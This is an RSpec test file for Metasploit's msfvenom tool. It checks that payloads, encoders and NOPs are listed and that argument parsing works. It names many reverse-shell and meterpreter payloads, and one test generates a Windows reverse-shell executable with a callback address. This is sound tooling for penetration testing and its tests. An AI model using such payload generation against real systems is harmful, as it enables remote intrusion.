
require 'spec_helper'
require 'msf/core'
# doesn't end in .rb or .so, so have to load instead of require
load File.join(Msf::Config.install_root, 'msfvenom')

describe MsfVenom do

	let(:stdin)  { StringIO.new("", "rb") }
	let(:stdout) { StringIO.new("", "wb") }
	let(:stderr) { StringIO.new("", "wb") }
	subject(:venom) { described_class.new(stdin, stdout, stderr, framework) }
	before(:each) do
		conf_dir = Metasploit::Framework.root.join('spec', 'dummy', 'framework','config')
		conf_dir.mkpath
	end
	after(:each) do
		dummy_dir = Metasploit::Framework.root.join('spec', 'dummy')
		dummy_dir.rmtree
	end

	before(:all) do
		conf_dir = Metasploit::Framework.root.join('spec', 'dummy', 'framework','config')
		conf_dir.mkpath
		create_opts = {
			:module_types => [
				::Msf::MODULE_PAYLOAD, ::Msf::MODULE_ENCODER, ::Msf::MODULE_NOP
			],
			'ConfigDirectory' => conf_dir.to_s,
			'DisableDatabase' => true
		}
		@framework = ::Msf::Simple::Framework.create(create_opts)
	end

	let(:framework) { @framework }

	describe "#dump_encoders" do
		it "should list known encoders" do
			dump = venom.dump_encoders

			%w!
				generic/none
				x86/shikata_ga_nai
				x64/xor
			!.each do |name|
				dump.should include(name)
			end
		end
	end

	describe "#dump_nops" do
		it "should list known nops" do
			dump = venom.dump_nops

			%w!
				x86/opty2
				armle/simple
			!.each do |name|
				dump.should include(name)
			end
		end
	end

	describe "#dump_payloads" do
		it "should list known payloads" do
			dump = venom.dump_payloads
			# Just a representative sample of some of the important ones.
			%w!
				cmd/unix/reverse
				java/meterpreter/reverse_tcp
				java/meterpreter/reverse_https
				linux/x86/shell/reverse_tcp
				linux/x86/shell_reverse_tcp
				linux/x64/shell/reverse_tcp
				linux/x64/shell_reverse_tcp
				linux/armle/shell/reverse_tcp
				linux/armle/shell_reverse_tcp
				linux/mipsbe/shell_reverse_tcp
				php/meterpreter/reverse_tcp
				windows/meterpreter/reverse_tcp
				windows/meterpreter/reverse_https
			!.each do |name|
				dump.should include(name)
			end
		end
	end

	describe "#parse_args" do

		context "with unexpected options" do
			it "should raise" do
				expect {
					venom.parse_args(%w! --non-existent-option !)
				}.to raise_error(MsfVenom::UsageError)
			end
		end

		context "with missing required arg" do
			%w! --platform -a -b -c -f -p -n -s -i -x !.each do |required_arg|
				it "#{required_arg} should raise" do
					expect {
						venom.parse_args([required_arg])
					}.to raise_error(MsfVenom::UsageError)
				end
			end
		end

	end

	describe "#generate_raw_payload" do

		before do
			venom.parse_args(args)
		end

		context "with --options" do
			context "and a payload" do
				let(:args) { %w! -o -p windows/meterpreter/reverse_tcp ! }

				it "should print options" do
					expect {
						venom.generate_raw_payload
					}.to_not raise_error
					output = stderr.string
					output.should include("LHOST")
					output.should include("LPORT")
				end
			end
			context "and an invalid payload" do
				let(:args) { %w! -o -p asdf! }
				it "should raise" do
					expect {
						venom.generate_raw_payload
					}.to raise_error(MsfVenom::UsageError)
				end
			end

		end

	end

	describe "#generate" do
		before { venom.parse_args(args) }

		context "with 'exe' format" do
			let(:args) { %w!-f exe -p windows/shell_reverse_tcp LHOST=192.168.0.1! }
			it "should print an exe to stdout" do
				expect { venom.generate }.to_not raise_error
				output = stdout.string
				output[0,2].should == "MZ"
			end
		end

		context "with incorrect datastore option format" do
			let(:args) { %w!-f exe -p windows/shell_reverse_tcp LPORT=asdf! }
			it "should fail validation" do
				expect { venom.generate }.to raise_error(Msf::OptionValidateError)
			end
		end

		context "without required datastore option" do
			let(:args) { %w!-f exe -p windows/shell_reverse_tcp ! }
			it "should fail validation" do
				expect { venom.generate }.to raise_error(Msf::OptionValidateError)
			end
		end

	end

end
